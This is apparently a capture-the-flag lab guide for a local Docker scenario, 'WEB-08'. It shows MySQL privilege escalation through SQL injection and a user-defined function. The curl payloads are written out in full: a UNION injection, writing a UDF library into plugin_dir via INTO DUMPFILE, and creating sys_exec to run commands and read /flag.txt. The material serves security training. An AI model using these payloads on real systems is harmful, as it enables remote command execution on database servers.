# WEB-08: MySQL UDF Privilege Escalation

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-08 |
| 名称 | MySQL UDF Privilege Escalation |
| 技术/CVE | MySQL UDF Abuse |
| 难度 | L3 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10108 |

## 场景概述
- 技术：MySQL UDF Abuse
- 难度：L3
- 交付方式：docker
- 入口端口：10108
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| Technique | MySQL UDF Abuse |
| Difficulty | L3 |
| Port | 10108 |
| DB | MySQL 8.0.35 (--secure-file-priv="") |

### Attack Path
```
SQLi in ?id= → Write UDF library to plugin_dir → CREATE FUNCTION sys_exec → RCE → /flag.txt
```

### Step-by-Step

```bash
# Step 1: Identify SQLi: SELECT ... WHERE id = $id
curl "http://localhost:10108/product.php?id=1'"

# Step 2: Check MySQL variables
curl "http://localhost:10108/product.php?id=1'+UNION+SELECT+@@plugin_dir,@@secure_file_priv--"

# Step 3: Write UDF library via INTO DUMPFILE
curl "http://localhost:10108/product.php?id=1'+UNION+SELECT+0x<UDF_HEX>,NULL+INTO+DUMPFILE+'/usr/lib/mysql/plugin/udf.so'--"

# Step 4: Create function and execute
curl "http://localhost:10108/product.php?id=1';CREATE+FUNCTION+sys_exec+RETURNS+STRING+SONAME+'udf.so';--"
curl "http://localhost:10108/product.php?id=1';SELECT+sys_exec('cat+/flag.txt');--"
# flag{web-08-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | MySQL-backed web service and SQL client semantics |
| 侦察与前置条件 | Database privilege and plugin/UDF directory discovery |
| 核心漏洞与利用 | Create and invoke a malicious MySQL UDF |
| 权限、横向或影响 | Database-server OS command execution |
| 验证 | Read the flag through the UDF command result |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
